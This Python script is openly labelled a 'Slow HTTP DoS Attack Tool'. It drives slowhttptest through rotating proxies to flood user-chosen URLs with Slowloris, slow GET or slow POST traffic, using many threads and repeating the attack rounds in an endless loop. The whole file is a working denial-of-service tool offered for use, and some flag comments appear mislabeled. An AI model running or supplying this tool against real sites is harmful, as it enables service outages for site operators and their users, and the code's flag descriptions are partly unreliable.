#!/usr/bin/env python3
import threading
import sys
import re
import time
import os
import subprocess # Import subprocess module
import urllib.request, urllib.error, urllib.parse
import socket
import argparse # Import argparse for command-line arguments

# Global variables (now populated by argparse)
TARGET_URLS = []
PROXY_FILE = "http.txt"
ATTACK_OPTION = 1
MAX_THREADS = 50 # Example: limit concurrent threads
ATTACK_INTERVAL = 60 # Seconds between attack rounds

class AttackThread(threading.Thread):
    """
    Thread class to run slowhttptest with different proxy configurations.
    """
    def __init__(self, target_url, attack_option, proxy_address, thread_id):
        self.target_url = target_url
        self.attack_option = attack_option
        self.proxy_address = proxy_address
        self.thread_id = thread_id
        self.stop_event = threading.Event() # Event to signal thread to stop
        threading.Thread.__init__(self)

    def run(self):
        """
        Executes the slowhttptest command based on the chosen attack option using subprocess.
        """
        print(f"[Thread {self.thread_id}] Attacking {self.target_url} via proxy {self.proxy_address}")
        
        # Construct the slowhttptest command
        cmd_args = [
            "slowhttptest",
            "-c", "1000", # Number of connections
            "-r", "200",  # Rate of connections per second
            "-u", self.target_url,
            "-p", "15",   # Proxy timeout in seconds
            "-d", self.proxy_address # Proxy address (format: ip:port)
        ]

        if self.attack_option == 1: # Slowloris
            cmd_args.extend([
                "-B", # Bypass Keep-Alive header
                "-i", "110", # Interval between connections in milliseconds
                "-s", "8192", # Socket buffer size
                "-t", "FFFFFUUUUCCCCKKKKYOUUUUUUUU" # Custom HTTP method
            ])
        elif self.attack_option == 2: # Slow HTTP GET
            cmd_args.extend([
                "-H", # Use HTTP GET method
                "-t", "GET",
                "-i", "10",
                "-x", "24" # Max connections (adjusted from original -x 24 to match example)
            ])
        else: # Slow POST (assuming option 3)
            cmd_args.extend([
                "-X", # Use HTTP POST method
                "-w", "512", # Bytes per chunk
                "-y", "1024", # First chunk size
                "-n", "5",   # Number of connection requests
                "-z", "32",  # Buffer size
                "-k", "3"    # Keep-alive connections
            ])

        try:
            # Execute the command using subprocess.Popen
            # This allows for better control and capturing output/errors
            process = subprocess.Popen(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Optional: Monitor the process for a limited time or until it finishes
            # For simplicity, we'll let it run. In a real scenario, you might want to
            # check process.poll() or use process.wait(timeout=...)
            # Here, we're not actively capturing output, but stderr can be useful.

            # Wait for a short period or until the process exits
            # If the process is still running after a certain time, we might consider it 'stuck'
            # For this example, we'll just let it run and rely on the timeout in '-p 15'
            stdout, stderr = process.communicate(timeout=30) # Add a process timeout

            if process.returncode != 0:
                print(f"[Thread {self.thread_id}] Error executing command for {self.target_url}: {stderr.strip()}")
            # else:
            #     print(f"[Thread {self.thread_id}] Command successful for {self.target_url}")

        except subprocess.TimeoutExpired:
            print(f"[Thread {self.thread_id}] Command timed out for {self.target_url}.")
            process.kill() # Ensure the process is terminated
        except KeyboardInterrupt:
            print(f"\n[Thread {self.thread_id}] Keyboard interrupt detected. Stopping thread.")
            self.stop_event.set()
            process.kill()
        except FileNotFoundError:
            print(f"[Thread {self.thread_id}] Error: 'slowhttptest' command not found. Is it installed and in your PATH?")
            self.stop_event.set()
        except Exception as detail:
            print(f"[Thread {self.thread_id}] Unexpected error: {detail}")
            self.stop_event.set()
        
        # Signal that this thread is done (or stopped)
        # No need to call super().run() if we handle everything here.
        # If we wanted to chain, we'd call it.

def check_proxy(proxy_address, timeout=5):
    """
    Checks if a proxy is alive by attempting a simple connection.
    Returns True if the proxy is likely alive, False otherwise.
    """
    try:
        # Try to establish a socket connection to the proxy
        # For HTTP proxies, the proxy listens on the specified IP and port
        host, port_str = proxy_address.split(':')
        port = int(port_str)
        
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError, ValueError):
        return False

def load_proxies(proxy_file_path):
    """
    Loads proxies from a file and returns a list of valid proxy addresses.
    Optionally filters out invalid ones.
    """
    valid_proxies = []
    try:
        with open(proxy_file_path, "rb") as fo:
            for proxy_line in fo:
                proxy_address = proxy_line.decode().strip()
                if not proxy_address:
                    continue
                
                # Basic validation of proxy format (ip:port)
                if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", proxy_address):
                    # Optional: uncomment the line below to actively check each proxy
                    # if check_proxy(proxy_address):
                    #     valid_proxies.append(proxy_address)
                    # else:
                    #     print(f"[-] Proxy {proxy_address} appears to be dead. Skipping.")
                    valid_proxies.append(proxy_address) # Add all proxies for now, rely on slowhttptest timeout
                else:
                    print(f"[-] Invalid proxy format in file: {proxy_address}. Skipping.")
    except FileNotFoundError:
        print(f"[!] Error: Proxy file '{proxy_file_path}' not found.")
        sys.exit(1)
    except Exception as detail:
        print(f"[!] An unexpected error occurred while loading proxies: {detail}")
        sys.exit(1)
        
    if not valid_proxies:
        print(f"[!] No valid proxies found in {proxy_file_path}. Exiting.")
        sys.exit(1)
        
    print(f"[+] Loaded {len(valid_proxies)} proxies.")
    return valid_proxies

def dos(target_urls, attack_option, proxy_list):
    """
    Initiates the DoS attack by creating threads for each target URL and proxy.
    Handles both HTTP and HTTPS URLs.
    """
    threads = []
    proxy_index = 0
    num_proxies = len(proxy_list)

    if num_proxies == 0:
        print("[!] No proxies available to start the attack.")
        return

    for target_url_item in target_urls:
        if not (target_url_item.startswith("http://") or target_url_item.startswith("https://")):
            print(f"[-] Skipping invalid URL format: {target_url_item} (must start with http:// or https://)")
            continue

        # Distribute proxies among URLs
        for i in range(min(len(proxy_list), MAX_THREADS // len(target_urls) + 1)): # Simple distribution
            proxy_address = proxy_list[proxy_index % num_proxies]
            proxy_index += 1
            
            thread_id = len(threads) + 1
            thread = AttackThread(target_url_item, attack_option, proxy_address, thread_id)
            threads.append(thread)
            thread.start()

            if len(threads) >= MAX_THREADS:
                print(f"[!] Reached maximum thread limit ({MAX_THREADS}). Waiting for some to finish.")
                # Wait for one thread to finish to free up a slot (basic throttling)
                for t in threads:
                    if not t.is_alive():
                        threads.remove(t)
                        break
                time.sleep(1) # Short pause before checking again

    # Wait for all active threads to complete
    for thread in threads:
        thread.join()
    
    print("[+] All attack threads for this batch have finished.")

def main():
    """
    Main function to parse arguments and start the attack loop.
    """
    parser = argparse.ArgumentParser(
        description="Slow HTTP DoS Attack Tool using slowhttptest.",
        formatter_class=argparse.RawTextHelpFormatter # Helps format description nicely
    )
    parser.add_argument(
        "urls",
        metavar="URL",
        nargs="+", # Expect one or more URLs
        help="Target URL(s) to attack (e.g., http://example.com or https://secure.example.org)"
    )
    parser.add_argument(
        "-p", "--proxy-file",
        default="http.txt",
        help="Path to the file containing proxy servers (one ip:port per line).\nDefault: http.txt"
    )
    parser.add_argument(
        "-o", "--option",
        type=int,
        default=1,
        choices=[1, 2, 3], # Allow only options 1, 2, or 3
        help="Attack option:\n"
             "1: Slowloris (default)\n"
             "2: Slow HTTP GET\n"
             "3: Slow POST"
    )
    parser.add_argument(
        "-t", "--max-threads",
        type=int,
        default=50,
        help="Maximum number of concurrent threads to run.\nDefault: 50"
    )
    parser.add_argument(
        "-i", "--interval",
        type=int,
        default=60,
        help="Interval in seconds between attack rounds.\nDefault: 60"
    )
    parser.add_argument(
        "--check-proxies",
        action="store_true", # If this flag is present, it's True
        help="Actively check if proxies are alive before starting the attack.\nThis can take a long time if you have many proxies."
    )

    args = parser.parse_args()

    global TARGET_URLS, PROXY_FILE, ATTACK_OPTION, MAX_THREADS, ATTACK_INTERVAL
    TARGET_URLS = args.urls
    PROXY_FILE = args.proxy_file
    ATTACK_OPTION = args.option
    MAX_THREADS = args.max_threads
    ATTACK_INTERVAL = args.interval

    print("--- Starting DoS Attack Configuration ---")
    print(f"Target URLs: {TARGET_URLS}")
    print(f"Proxy File: {PROXY_FILE}")
    print(f"Attack Option: {ATTACK_OPTION}")
    print(f"Max Concurrent Threads: {MAX_THREADS}")
    print(f"Attack Interval: {ATTACK_INTERVAL} seconds")
    print(f"Check Proxies Actively: {'Yes' if args.check_proxies else 'No'}")
    print("---------------------------------------")
    
    # Load proxies
    proxy_list = load_proxies(PROXY_FILE)
    
    # If user wants to check proxies actively, do it here
    if args.check_proxies:
        print("\n--- Actively checking proxies... ---")
        alive_proxies = []
        for i, proxy in enumerate(proxy_list):
            if check_proxy(proxy):
                alive_proxies.append(proxy)
                print(f"[{i+1}/{len(proxy_list)}] Proxy {proxy}: LIVE")
            else:
                print(f"[{i+1}/{len(proxy_list)}] Proxy {proxy}: DEAD")
        
        if not alive_proxies:
            print("[!] No live proxies found after checking. Exiting.")
            sys.exit(1)
        proxy_list = alive_proxies # Use only live proxies
        print(f"--- {len(alive_proxies)} live proxies found. ---")
        time.sleep(2) # Short pause before starting attacks

    # Infinite loop to continuously run the DoS attack
    while True:
        print(f"\n--- Starting DoS attack round ---")
        dos(TARGET_URLS, ATTACK_OPTION, proxy_list)
        print("\n--- Attack round finished ---")
        
        print(f"Waiting for {ATTACK_INTERVAL} seconds before next attack round...")
        time.sleep(ATTACK_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Exiting gracefully.")
        sys.exit(0)
